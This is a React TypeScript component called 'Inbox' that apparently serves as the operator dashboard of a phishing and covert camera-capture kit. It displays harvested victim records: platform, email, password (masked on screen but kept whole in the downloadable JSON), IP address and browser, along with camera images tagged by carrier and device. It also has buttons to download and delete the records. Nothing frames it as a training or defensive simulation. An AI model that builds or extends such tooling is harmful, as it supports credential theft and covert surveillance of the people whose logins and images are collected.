
import { useState, useEffect } from 'react';
import Layout from '@/components/Layout';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Badge } from '@/components/ui/badge';
import { Button } from '@/components/ui/button';
import { 
  Inbox as InboxIcon, 
  Fish, 
  Camera, 
  Calendar, 
  Eye, 
  Trash2,
  Download,
  Image as ImageIcon
} from 'lucide-react';

const Inbox = () => {
  const [phishingData, setPhishingData] = useState<any[]>([]);
  const [cameraData, setCameraData] = useState<any[]>([]);
  
  const currentUser = JSON.parse(localStorage.getItem('currentUser') || '{}');

  useEffect(() => {
    // Load user-specific captured data
    const loadInboxData = () => {
      const phishing = JSON.parse(localStorage.getItem(`phishing_${currentUser.id}`) || '[]');
      const camera = JSON.parse(localStorage.getItem(`camera_${currentUser.id}`) || '[]');
      
      setPhishingData(phishing);
      setCameraData(camera);
    };

    loadInboxData();
    
    // Refresh every 5 seconds to check for new data
    const interval = setInterval(loadInboxData, 5000);
    return () => clearInterval(interval);
  }, [currentUser.id]);

  const deletePhishingData = (index: number) => {
    const updatedData = phishingData.filter((_, i) => i !== index);
    setPhishingData(updatedData);
    localStorage.setItem(`phishing_${currentUser.id}`, JSON.stringify(updatedData));
  };

  const deleteCameraData = (index: number) => {
    const updatedData = cameraData.filter((_, i) => i !== index);
    setCameraData(updatedData);
    localStorage.setItem(`camera_${currentUser.id}`, JSON.stringify(updatedData));
  };

  const downloadData = (data: any, filename: string) => {
    const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  };

  const formatDate = (timestamp: number) => {
    return new Date(timestamp).toLocaleString();
  };

  return (
    <Layout>
      <div className="space-y-6">
        <div className="text-center">
          <h1 className="text-3xl font-bold text-white mb-2">Inbox</h1>
          <p className="text-gray-400">Your captured data and submissions</p>
        </div>

        {/* Stats */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
          <Card className="bg-slate-800/50 border-slate-700">
            <CardContent className="p-4">
              <div className="flex items-center gap-3">
                <div className="h-10 w-10 bg-orange-500 rounded-lg flex items-center justify-center">
                  <Fish className="h-5 w-5 text-white" />
                </div>
                <div>
                  <p className="text-gray-400 text-sm">Phishing Data</p>
                  <p className="text-white text-lg font-semibold">{phishingData.length}</p>
                </div>
              </div>
            </CardContent>
          </Card>

          <Card className="bg-slate-800/50 border-slate-700">
            <CardContent className="p-4">
              <div className="flex items-center gap-3">
                <div className="h-10 w-10 bg-red-500 rounded-lg flex items-center justify-center">
                  <Camera className="h-5 w-5 text-white" />
                </div>
                <div>
                  <p className="text-gray-400 text-sm">Camera Captures</p>
                  <p className="text-white text-lg font-semibold">{cameraData.length}</p>
                </div>
              </div>
            </CardContent>
          </Card>

          <Card className="bg-slate-800/50 border-slate-700">
            <CardContent className="p-4">
              <div className="flex items-center gap-3">
                <div className="h-10 w-10 bg-blue-500 rounded-lg flex items-center justify-center">
                  <InboxIcon className="h-5 w-5 text-white" />
                </div>
                <div>
                  <p className="text-gray-400 text-sm">Total Items</p>
                  <p className="text-white text-lg font-semibold">{phishingData.length + cameraData.length}</p>
                </div>
              </div>
            </CardContent>
          </Card>
        </div>

        {/* Phishing Data */}
        <Card className="bg-slate-800/50 border-slate-700 backdrop-blur">
          <CardHeader>
            <CardTitle className="text-white flex items-center gap-2">
              <Fish className="h-5 w-5 text-orange-400" />
              Phishing Data
              <Badge className="bg-orange-500/20 text-orange-400">{phishingData.length}</Badge>
            </CardTitle>
          </CardHeader>
          <CardContent>
            {phishingData.length === 0 ? (
              <div className="text-center py-8">
                <Fish className="h-12 w-12 text-gray-500 mx-auto mb-3" />
                <p className="text-gray-400">No phishing data captured yet</p>
              </div>
            ) : (
              <div className="space-y-4">
                {phishingData.map((data, index) => (
                  <Card key={index} className="bg-slate-700/50 border-slate-600">
                    <CardContent className="p-4">
                      <div className="flex items-start justify-between">
                        <div className="flex-1">
                          <div className="flex items-center gap-2 mb-2">
                            <Badge className="bg-orange-500/20 text-orange-400">
                              {data.platform}
                            </Badge>
                            <span className="text-gray-400 text-sm flex items-center gap-1">
                              <Calendar className="h-3 w-3" />
                              {formatDate(data.timestamp)}
                            </span>
                          </div>
                          <div className="text-white space-y-1">
                            <p><strong>Email:</strong> {data.email}</p>
                            <p><strong>Password:</strong> {"*".repeat(data.password.length)}</p>
                            {data.ip && <p><strong>IP:</strong> {data.ip}</p>}
                            {data.userAgent && <p><strong>Browser:</strong> {data.userAgent}</p>}
                          </div>
                        </div>
                        <div className="flex gap-2">
                          <Button
                            size="sm"
                            onClick={() => downloadData(data, `phishing_${data.platform}_${index}.json`)}
                            className="bg-blue-500 hover:bg-blue-600"
                          >
                            <Download className="h-4 w-4" />
                          </Button>
                          <Button
                            size="sm"
                            variant="destructive"
                            onClick={() => deletePhishingData(index)}
                          >
                            <Trash2 className="h-4 w-4" />
                          </Button>
                        </div>
                      </div>
                    </CardContent>
                  </Card>
                ))}
              </div>
            )}
          </CardContent>
        </Card>

        {/* Camera Data */}
        <Card className="bg-slate-800/50 border-slate-700 backdrop-blur">
          <CardHeader>
            <CardTitle className="text-white flex items-center gap-2">
              <Camera className="h-5 w-5 text-red-400" />
              Camera Captures
              <Badge className="bg-red-500/20 text-red-400">{cameraData.length}</Badge>
            </CardTitle>
          </CardHeader>
          <CardContent>
            {cameraData.length === 0 ? (
              <div className="text-center py-8">
                <Camera className="h-12 w-12 text-gray-500 mx-auto mb-3" />
                <p className="text-gray-400">No camera captures yet</p>
              </div>
            ) : (
              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
                {cameraData.map((data, index) => (
                  <Card key={index} className="bg-slate-700/50 border-slate-600">
                    <CardContent className="p-4">
                      <div className="space-y-3">
                        <div className="flex items-center justify-between">
                          <Badge className="bg-red-500/20 text-red-400">
                            {data.carrier}
                          </Badge>
                          <span className="text-gray-400 text-xs">
                            {formatDate(data.timestamp)}
                          </span>
                        </div>
                        
                        {data.imageUrl ? (
                          <div className="aspect-square bg-slate-800 rounded-lg flex items-center justify-center overflow-hidden">
                            <img 
                              src={data.imageUrl} 
                              alt="Captured" 
                              className="w-full h-full object-cover"
                            />
                          </div>
                        ) : (
                          <div className="aspect-square bg-slate-800 rounded-lg flex items-center justify-center">
                            <ImageIcon className="h-8 w-8 text-gray-500" />
                          </div>
                        )}
                        
                        <div className="text-white text-sm space-y-1">
                          {data.ip && <p><strong>IP:</strong> {data.ip}</p>}
                          {data.userAgent && <p><strong>Device:</strong> {data.userAgent}</p>}
                        </div>
                        
                        <div className="flex gap-2">
                          <Button
                            size="sm"
                            onClick={() => downloadData(data, `camera_${data.carrier}_${index}.json`)}
                            className="bg-blue-500 hover:bg-blue-600 flex-1"
                          >
                            <Download className="h-4 w-4 mr-1" />
                            Download
                          </Button>
                          <Button
                            size="sm"
                            variant="destructive"
                            onClick={() => deleteCameraData(index)}
                          >
                            <Trash2 className="h-4 w-4" />
                          </Button>
                        </div>
                      </div>
                    </CardContent>
                  </Card>
                ))}
              </div>
            )}
          </CardContent>
        </Card>
      </div>
    </Layout>
  );
};

export default Inbox;
